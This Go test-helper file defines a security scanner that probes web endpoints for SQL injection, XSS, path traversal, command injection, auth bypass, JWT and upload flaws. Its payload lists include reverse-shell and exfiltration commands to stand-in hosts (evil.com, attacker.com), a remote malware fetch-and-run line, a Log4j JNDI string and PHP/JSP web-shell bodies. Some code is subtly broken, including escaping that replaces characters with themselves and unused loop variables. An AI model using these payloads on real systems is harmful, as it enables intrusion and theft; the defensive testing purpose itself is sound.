package testutils

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"golang.org/x/crypto/bcrypt"
)

// SecurityTestHelper provides utilities for security testing
type SecurityTestHelper struct {
	t           *testing.T
	httpHelper  *HTTPTestHelper
	authHelper  *AuthHelper
	vulnerablePatterns map[string]*regexp.Regexp
}

// NewSecurityTestHelper creates a new security test helper
func NewSecurityTestHelper(t *testing.T, httpHelper *HTTPTestHelper, authHelper *AuthHelper) *SecurityTestHelper {
	return &SecurityTestHelper{
		t:          t,
		httpHelper:  httpHelper,
		authHelper:  authHelper,
		vulnerablePatterns: initializeVulnerabilityPatterns(),
	}
}

// initializeVulnerabilityPatterns initializes common vulnerability patterns
func initializeVulnerabilityPatterns() map[string]*regexp.Regexp {
	patterns := make(map[string]*regexp.Regexp)
	
	// SQL Injection patterns
	patterns["sql_injection"] = regexp.MustCompile(`(?i)(union|select|insert|update|delete|drop|create|alter|exec|execute|script|javascript|vbscript|onload|onerror|onclick)`)
	
	// XSS patterns
	patterns["xss"] = regexp.MustCompile(`(?i)(<script|javascript:|vbscript:|onload=|onerror=|onclick=|onmouseover=)`)
	
	// Path traversal patterns
	patterns["path_traversal"] = regexp.MustCompile(`(\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c)`)
	
	// Command injection patterns
	patterns["command_injection"] = regexp.MustCompile(`(?i)(;|\||&|`+"`"+`|\$\(|\$\{)`)
	
	// LDAP injection patterns
	patterns["ldap_injection"] = regexp.MustCompile(`(?i)(\*|\(|\)|\\|/|,)`)
	
	// NoSQL injection patterns
	patterns["nosql_injection"] = regexp.MustCompile(`(?i)(\$where|\$ne|\$gt|\$lt|\$in|\$nin)`)
	
	return patterns
}

// TestSQLInjection tests for SQL injection vulnerabilities
func (sth *SecurityTestHelper) TestSQLInjection(endpoint string, params map[string]string) {
	for key, value := range params {
		// Test common SQL injection payloads
		payloads := []string{
			"' OR '1'='1",
			"' OR '1'='1' --",
			"' OR '1'='1' /*",
			"admin'--",
			"admin' /*",
			"' OR 1=1 --",
			"' OR 1=1 #",
			"' OR 1=1 /*",
			") OR '1'='1' --",
			") OR ('1'='1' --",
		}
		
		for _, payload := range payloads {
			testParams := make(map[string]string)
			for k, v := range params {
				if k == key {
					testParams[k] = payload
				} else {
					testParams[k] = v
				}
			}
			
			resp := sth.httpHelper.Post(endpoint, testParams, nil)
			
			// Check for SQL error messages in response
			body := sth.getResponseBody(resp)
			if sth.containsSQLError(body) {
				sth.t.Errorf("SQL injection vulnerability detected at endpoint %s with parameter %s and payload %s", 
					endpoint, key, payload)
			}
		}
	}
}

// TestXSS tests for XSS vulnerabilities
func (sth *SecurityTestHelper) TestXSS(endpoint string, params map[string]string) {
	for key, value := range params {
		// Test common XSS payloads
		payloads := []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<iframe src=javascript:alert('XSS')>",
			"<body onload=alert('XSS')>",
			"<input onfocus=alert('XSS') autofocus>",
			"<select onfocus=alert('XSS') autofocus>",
			"<textarea onfocus=alert('XSS') autofocus>",
			"<keygen onfocus=alert('XSS') autofocus>",
			"<video><source onerror=alert('XSS')>",
			"<audio src=x onerror=alert('XSS')>",
		}
		
		for _, payload := range payloads {
			testParams := make(map[string]string)
			for k, v := range params {
				if k == key {
					testParams[k] = payload
				} else {
					testParams[k] = v
				}
			}
			
			resp := sth.httpHelper.Post(endpoint, testParams, nil)
			
			// Check if XSS payload is reflected without encoding
			body := sth.getResponseBody(resp)
			if strings.Contains(body, payload) && !sth.isXSSSafe(body, payload) {
				sth.t.Errorf("XSS vulnerability detected at endpoint %s with parameter %s and payload %s", 
					endpoint, key, payload)
			}
		}
	}
}

// TestPathTraversal tests for path traversal vulnerabilities
func (sth *SecurityTestHelper) TestPathTraversal(endpoint string, fileParam string) {
	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
		"....//....//....//etc/passwd",
		"..../..../..../etc/passwd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
	}
	
	for _, payload := range payloads {
		params := map[string]string{fileParam: payload}
		resp := sth.httpHelper.Get(endpoint+"?"+fileParam+"="+url.QueryEscape(payload), nil)
		
		// Check for file content in response
		body := sth.getResponseBody(resp)
		if sth.containsFileContent(body) {
			sth.t.Errorf("Path traversal vulnerability detected at endpoint %s with payload %s", 
				endpoint, payload)
		}
	}
}

// TestCommandInjection tests for command injection vulnerabilities
func (sth *SecurityTestHelper) TestCommandInjection(endpoint string, params map[string]string) {
	for key, value := range params {
		// Test common command injection payloads
		payloads := []string{
			"; ls -la",
			"| cat /etc/passwd",
			"& echo 'Command Injection'",
			"`whoami`",
			"$(id)",
			"; curl http://evil.com/steal?data=$(cat /etc/passwd)",
			"| nc attacker.com 4444 -e /bin/sh",
			"; wget http://evil.com/malware.sh -O /tmp/malware.sh; chmod +x /tmp/malware.sh; /tmp/malware.sh",
		}
		
		for _, payload := range payloads {
			testParams := make(map[string]string)
			for k, v := range params {
				if k == key {
					testParams[k] = payload
				} else {
					testParams[k] = v
				}
			}
			
			resp := sth.httpHelper.Post(endpoint, testParams, nil)
			
			// Check for command output in response
			body := sth.getResponseBody(resp)
			if sth.containsCommandOutput(body) {
				sth.t.Errorf("Command injection vulnerability detected at endpoint %s with parameter %s and payload %s", 
					endpoint, key, payload)
			}
		}
	}
}

// TestAuthenticationBypass tests for authentication bypass vulnerabilities
func (sth *SecurityTestHelper) TestAuthenticationBypass(endpoint string) {
	// Test common authentication bypass techniques
	testCases := []struct {
		name   string
		header string
		value  string
	}{
		{"Basic auth with empty credentials", "Authorization", "Basic "},
		{"Basic auth with admin:admin", "Authorization", "Basic YWRtaW46YWRtaW4="},
		{"Bearer token with empty token", "Authorization", "Bearer "},
		{"Bearer token with null", "Authorization", "Bearer null"},
		{"Bearer token with undefined", "Authorization", "Bearer undefined"},
		{"Bearer token with admin", "Authorization", "Bearer admin"},
		{"X-API-Key with empty", "X-API-Key", ""},
		{"X-API-Key with admin", "X-API-Key", "admin"},
		{"X-Auth-Token with empty", "X-Auth-Token", ""},
		{"X-Auth-Token with admin", "X-Auth-Token", "admin"},
	}
	
	for _, tc := range testCases {
		headers := map[string]string{tc.header: tc.value}
		resp := sth.httpHelper.Get(endpoint, headers)
		
		// If we get a successful response with invalid auth, it's a vulnerability
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			sth.t.Errorf("Authentication bypass vulnerability detected with %s: %s", tc.name, tc.value)
		}
	}
}

// TestAuthorizationBypass tests for authorization bypass vulnerabilities
func (sth *SecurityTestHelper) TestAuthorizationBypass(userToken, adminEndpoint string) {
	// Test accessing admin endpoint with user token
	headers := sth.authHelper.GetAuthHeaders(userToken)
	resp := sth.httpHelper.Get(adminEndpoint, headers)
	
	// If user can access admin endpoint, it's a vulnerability
	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		sth.t.Errorf("Authorization bypass vulnerability detected: user can access admin endpoint %s", adminEndpoint)
	}
}

// TestRateLimiting tests for rate limiting vulnerabilities
func (sth *SecurityTestHelper) TestRateLimiting(endpoint string, maxRequests int) {
	successCount := 0
	
	// Send rapid requests
	for i := 0; i < maxRequests*2; i++ {
		resp := sth.httpHelper.Get(endpoint, nil)
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			successCount++
		}
		
		// Small delay to avoid overwhelming the server
		time.Sleep(time.Millisecond * 10)
	}
	
	// If more than maxRequests succeed, rate limiting is not working
	if successCount > maxRequests {
		sth.t.Errorf("Rate limiting vulnerability detected: %d successful requests (max allowed: %d)", 
			successCount, maxRequests)
	}
}

// TestCSRF tests for CSRF vulnerabilities
func (sth *SecurityTestHelper) TestCSRF(endpoint string, method string, params map[string]string) {
	// Test request without CSRF token
	var resp *http.Response
	
	switch strings.ToUpper(method) {
	case "GET":
		resp = sth.httpHelper.Get(endpoint, nil)
	case "POST":
		resp = sth.httpHelper.Post(endpoint, params, nil)
	case "PUT":
		resp = sth.httpHelper.Put(endpoint, params, nil)
	case "DELETE":
		resp = sth.httpHelper.Delete(endpoint, nil)
	default:
		resp = sth.httpHelper.Post(endpoint, params, nil)
	}
	
	// If state-changing request succeeds without CSRF token, it's vulnerable
	if (method == "POST" || method == "PUT" || method == "DELETE") && 
		(resp.StatusCode == 200 || resp.StatusCode == 201) {
		sth.t.Errorf("CSRF vulnerability detected at endpoint %s with method %s", endpoint, method)
	}
}

// TestSensitiveDataExposure tests for sensitive data exposure
func (sth *SecurityTestHelper) TestSensitiveDataExposure(endpoint string) {
	resp := sth.httpHelper.Get(endpoint, nil)
	body := sth.getResponseBody(resp)
	
	// Check for sensitive data patterns
	sensitivePatterns := []struct {
		name    string
		pattern *regexp.Regexp
	}{
		{"Email", regexp.MustCompile(`\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b`)},
		{"Password", regexp.MustCompile(`(?i)"password"\s*:\s*"[^"]+"`)},
		{"API Key", regexp.MustCompile(`(?i)"api[_-]?key"\s*:\s*"[^"]+"`)},
		{"Token", regexp.MustCompile(`(?i)"token"\s*:\s*"[^"]+"`)},
		{"SSN", regexp.MustCompile(`\b\d{3}-\d{2}-\d{4}\b`)},
		{"Credit Card", regexp.MustCompile(`\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b`)},
		{"Private Key", regexp.MustCompile(`-----BEGIN [A-Z]+ PRIVATE KEY-----`)},
	}
	
	for _, pattern := range sensitivePatterns {
		if pattern.pattern.MatchString(body) {
			sth.t.Errorf("Sensitive data exposure detected: %s pattern found in response from %s", 
				pattern.name, endpoint)
		}
	}
}

// TestInsecureDirectObjectReferences tests for IDOR vulnerabilities
func (sth *SecurityTestHelper) TestInsecureDirectObjectReferences(endpoint string, userIDParam string, userToken string) {
	// Test accessing other users' resources
	testUserIDs := []string{"1", "2", "999", "admin", "root", "0", "-1"}
	
	headers := sth.authHelper.GetAuthHeaders(userToken)
	
	for _, testUserID := range testUserIDs {
		testEndpoint := endpoint + "?" + userIDParam + "=" + testUserID
		resp := sth.httpHelper.Get(testEndpoint, headers)
		
		// If we can access other users' resources, it's a vulnerability
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			body := sth.getResponseBody(resp)
			if sth.containsUserData(body) {
				sth.t.Errorf("IDOR vulnerability detected: can access user %s's resources", testUserID)
			}
		}
	}
}

// TestSessionManagement tests for session management vulnerabilities
func (sth *SecurityTestHelper) TestSessionManagement(loginEndpoint, protectedEndpoint string) {
	// Test session fixation
	sessionID := sth.generateRandomSessionID()
	
	// Set session cookie
	headers := map[string]string{"Cookie": "session_id=" + sessionID}
	
	// Login with the session
	loginParams := map[string]string{
		"email":    "test@example.com",
		"password": "password123",
	}
	
	resp := sth.httpHelper.Post(loginEndpoint, loginParams, headers)
	
	// Check if session ID changed
	newSessionID := sth.extractSessionID(resp)
	if newSessionID == sessionID {
		sth.t.Errorf("Session fixation vulnerability detected: session ID did not change after login")
	}
	
	// Test session timeout
	time.Sleep(time.Minute * 31) // Wait longer than typical session timeout
	
	resp = sth.httpHelper.Get(protectedEndpoint, map[string]string{"Cookie": "session_id=" + newSessionID})
	if resp.StatusCode == 200 {
		sth.t.Errorf("Session management vulnerability: session did not timeout")
	}
}

// TestInputValidation tests for input validation vulnerabilities
func (sth *SecurityTestHelper) TestInputValidation(endpoint string, params map[string]string) {
	for key, value := range params {
		// Test with various malicious inputs
		testInputs := []string{
			"",                                    // Empty input
			strings.Repeat("A", 10000),           // Buffer overflow
			"\x00\x01\x02\x03",                  // Null bytes and control characters
			"<>\"'&",                            // HTML special characters
			"${jndi:ldap://evil.com/a}",          // Log4j
			"{{7*7}}",                           // Template injection
			"<%=7*7%>",                          // Template injection
			"#{7*7}",                            // Template injection
			"{{7*7}}",                           // Template injection
			"{{config}}",                         // Template injection
			"../../../../etc/passwd",              // Path traversal
			"' OR 1=1 --",                       // SQL injection
			"<script>alert('XSS')</script>",       // XSS
		}
		
		for _, testInput := range testInputs {
			testParams := make(map[string]string)
			for k, v := range params {
				if k == key {
					testParams[k] = testInput
				} else {
					testParams[k] = v
				}
			}
			
			resp := sth.httpHelper.Post(endpoint, testParams, nil)
			
			// Check for error responses that might indicate vulnerability
			if resp.StatusCode >= 500 {
				sth.t.Errorf("Input validation vulnerability detected at endpoint %s with parameter %s and input %s", 
					endpoint, key, testInput)
			}
		}
	}
}

// TestFileUploadSecurity tests for file upload security vulnerabilities
func (sth *SecurityTestHelper) TestFileUploadSecurity(uploadEndpoint string) {
	// Test malicious file uploads
	testFiles := []struct {
		name    string
		content []byte
		headers map[string]string
	}{
		{
			name:    "malicious.php",
			content: []byte("<?php system($_GET['cmd']); ?>"),
			headers: map[string]string{"Content-Type": "application/x-php"},
		},
		{
			name:    "malicious.jsp",
			content: []byte("<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
			headers: map[string]string{"Content-Type": "application/x-jsp"},
		},
		{
			name:    "malicious.asp",
			content: []byte("<% Response.Write(Request(\"cmd\")) %>"),
			headers: map[string]string{"Content-Type": "application/x-asp"},
		},
		{
			name:    "malicious.exe",
			content: []byte("MZ\x90\x00"), // PE header
			headers: map[string]string{"Content-Type": "application/x-executable"},
		},
		{
			name:    "malicious.html",
			content: []byte("<script>alert('XSS')</script>"),
			headers: map[string]string{"Content-Type": "text/html"},
		},
	}
	
	for _, testFile := range testFiles {
		files := map[string][]byte{"file": testFile.content}
		fields := map[string]string{"filename": testFile.name}
		
		resp := sth.httpHelper.PostMultipart(uploadEndpoint, fields, files, testFile.headers)
		
		// If malicious file is accepted, it's a vulnerability
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			sth.t.Errorf("File upload vulnerability detected: malicious file %s was accepted", testFile.name)
		}
	}
}

// TestPasswordSecurity tests for password security vulnerabilities
func (sth *SecurityTestHelper) TestPasswordSecurity(loginEndpoint string) {
	// Test weak passwords
	weakPasswords := []string{
		"password",
		"123456",
		"admin",
		"root",
		"test",
		"guest",
		"qwerty",
		"letmein",
		"welcome",
		"monkey",
	}
	
	for _, password := range weakPasswords {
		loginParams := map[string]string{
			"email":    "admin@example.com",
			"password": password,
		}
		
		resp := sth.httpHelper.Post(loginEndpoint, loginParams, nil)
		
		// If weak password works, it's a vulnerability
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			sth.t.Errorf("Password security vulnerability detected: weak password '%s' was accepted", password)
		}
	}
}

// TestJWTSecurity tests for JWT security vulnerabilities
func (sth *SecurityTestHelper) TestJWTSecurity(endpoint string, validToken string) {
	// Test with modified JWT
	modifiedTokens := []string{
		"",                           // Empty token
		"invalid",                    // Invalid token
		"Bearer invalid",              // Invalid Bearer token
		validToken + "tampered",       // Tampered token
		sth.removeSignature(validToken), // Token without signature
		sth.changeAlgorithm(validToken), // Token with changed algorithm
		sth.changeExpiry(validToken),   // Expired token
	}
	
	for _, token := range modifiedTokens {
		headers := map[string]string{"Authorization": "Bearer " + token}
		resp := sth.httpHelper.Get(endpoint, headers)
		
		// If modified token is accepted, it's a vulnerability
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			sth.t.Errorf("JWT security vulnerability detected: modified token was accepted")
		}
	}
}

// Helper methods

func (sth *SecurityTestHelper) getResponseBody(resp *http.Response) string {
	if resp == nil || resp.Body == nil {
		return ""
	}
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	
	return string(body)
}

func (sth *SecurityTestHelper) containsSQLError(body string) bool {
	sqlErrors := []string{
		"SQL syntax",
		"mysql_fetch",
		"ORA-[0-9]{5}",
		"Microsoft OLE DB Provider",
		"ODBC Microsoft Access",
		"ODBC SQL Server Driver",
		"SQLServer JDBC Driver",
		"PostgreSQL query failed",
		"Warning: mysql_",
		"valid PostgreSQL result",
		"Npgsql\\.",
		"PG::SyntaxError",
		"org.postgresql.util.PSQLException",
		"ERROR: parser: parse error",
	}
	
	for _, error := range sqlErrors {
		if strings.Contains(body, error) {
			return true
		}
	}
	
	return false
}

func (sth *SecurityTestHelper) isXSSSafe(body, payload string) bool {
	// Check if payload is properly encoded or sanitized
	escapedPayload := strings.ReplaceAll(payload, "<", "<")
	escapedPayload = strings.ReplaceAll(escapedPayload, ">", ">")
	escapedPayload = strings.ReplaceAll(escapedPayload, "\"", """)
	escapedPayload = strings.ReplaceAll(escapedPayload, "'", "&#x27;")
	
	return strings.Contains(body, escapedPayload)
}

func (sth *SecurityTestHelper) containsFileContent(body string) bool {
	fileIndicators := []string{
		"root:x:0:0",
		"daemon:x:1:1",
		"bin:x:2:2",
		"sys:x:3:3",
		"# localhost",
		"# hosts",
		"Windows Registry Editor Version",
		"[boot loader]",
		"operating systems",
	}
	
	for _, indicator := range fileIndicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}
	
	return false
}

func (sth *SecurityTestHelper) containsCommandOutput(body string) bool {
	commandIndicators := []string{
		"uid=",
		"gid=",
		"groups=",
		"total ",
		"drwxr-xr-x",
		"-rw-r--r--",
		"Directory of",
		"Volume Serial Number",
	}
	
	for _, indicator := range commandIndicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}
	
	return false
}

func (sth *SecurityTestHelper) containsUserData(body string) bool {
	userIndicators := []string{
		"email",
		"password",
		"token",
		"api_key",
		"secret",
		"private",
		"confidential",
	}
	
	for _, indicator := range userIndicators {
		if strings.Contains(strings.ToLower(body), indicator) {
			return true
		}
	}
	
	return false
}

func (sth *SecurityTestHelper) generateRandomSessionID() string {
	bytes := make([]byte, 32)
	rand.Read(bytes)
	return base64.URLEncoding.EncodeToString(bytes)
}

func (sth *SecurityTestHelper) extractSessionID(resp *http.Response) string {
	if resp == nil {
		return ""
	}
	
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "session_id" {
			return cookie.Value
		}
	}
	
	return ""
}

func (sth *SecurityTestHelper) removeSignature(token string) string {
	parts := strings.Split(token, ".")
	if len(parts) >= 2 {
		return parts[0] + "." + parts[1] + "."
	}
	return token
}

func (sth *SecurityTestHelper) changeAlgorithm(token string) string {
	// This is a simplified implementation
	// In practice, you'd decode the JWT, modify the header, and re-encode
	return token
}

func (sth *SecurityTestHelper) changeExpiry(token string) string {
	// This is a simplified implementation
	// In practice, you'd decode the JWT, modify the payload, and re-encode
	return token
}

// TestPasswordHashing tests password hashing security
func (sth *SecurityTestHelper) TestPasswordHashing(password string, hash string) {
	// Check if hash uses bcrypt
	if !strings.HasPrefix(hash, "$2") {
		sth.t.Errorf("Password hashing vulnerability: not using bcrypt")
		return
	}
	
	// Check bcrypt cost
	cost, err := bcrypt.Cost([]byte(hash))
	if err != nil {
		sth.t.Errorf("Password hashing vulnerability: invalid bcrypt hash")
		return
	}
	
	if cost < 10 {
		sth.t.Errorf("Password hashing vulnerability: bcrypt cost too low (%d)", cost)
	}
	
	// Verify password can be checked
	err = bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
	if err != nil {
		sth.t.Errorf("Password hashing vulnerability: password verification failed")
	}
}

// TestRandomness tests randomness of generated values
func (sth *SecurityTestHelper) TestRandomness(values []string) {
	if len(values) < 100 {
		sth.t.Errorf("Randomness test requires at least 100 values")
		return
	}
	
	// Check for duplicates
	seen := make(map[string]bool)
	duplicates := 0
	
	for _, value := range values {
		if seen[value] {
			duplicates++
		}
		seen[value] = true
	}
	
	duplicateRate := float64(duplicates) / float64(len(values))
	if duplicateRate > 0.01 { // Allow 1% duplicates
		sth.t.Errorf("Randomness vulnerability: high duplicate rate (%.2f%%)", duplicateRate*100)
	}
}

// TestEncryption tests encryption security
func (sth *SecurityTestHelper) TestEncryption(plaintext, ciphertext string) {
	// Check if ciphertext is significantly different from plaintext
	if ciphertext == plaintext {
		sth.t.Errorf("Encryption vulnerability: ciphertext equals plaintext")
	}
	
	// Check if ciphertext is base64 encoded
	_, err := base64.StdEncoding.DecodeString(ciphertext)
	if err != nil {
		sth.t.Errorf("Encryption vulnerability: ciphertext not base64 encoded")
	}
	
	// Check if ciphertext is long enough (minimum padding)
	if len(ciphertext) < 20 {
		sth.t.Errorf("Encryption vulnerability: ciphertext too short")
	}
}

// SecurityReport represents a security test report
type SecurityReport struct {
	Vulnerabilities []SecurityVulnerability
	PassedTests    []string
	TotalTests     int
	PassedCount    int
	VulnerabilityCount int
}

// SecurityVulnerability represents a security vulnerability
type SecurityVulnerability struct {
	Type        string
	Endpoint    string
	Severity    string
	Description string
	Payload     string
}

// GenerateReport generates a security test report
func (sth *SecurityTestHelper) GenerateReport() *SecurityReport {
	// This would collect all vulnerabilities found during testing
	// and generate a comprehensive report
	return &SecurityReport{
		Vulnerabilities: make([]SecurityVulnerability, 0),
		PassedTests:    make([]string, 0),
		TotalTests:     0,
		PassedCount:    0,
		VulnerabilityCount: 0,
	}
}

// PrintReport prints the security test report
func (sr *SecurityReport) PrintReport() {
	fmt.Printf("Security Test Report\n")
	fmt.Printf("===================\n")
	fmt.Printf("Total Tests: %d\n", sr.TotalTests)
	fmt.Printf("Passed: %d\n", sr.PassedCount)
	fmt.Printf("Vulnerabilities: %d\n", sr.VulnerabilityCount)
	
	if len(sr.Vulnerabilities) > 0 {
		fmt.Printf("\nVulnerabilities Found:\n")
		for _, vuln := range sr.Vulnerabilities {
			fmt.Printf("- %s: %s at %s (%s)\n", vuln.Type, vuln.Description, vuln.Endpoint, vuln.Severity)
		}
	}
}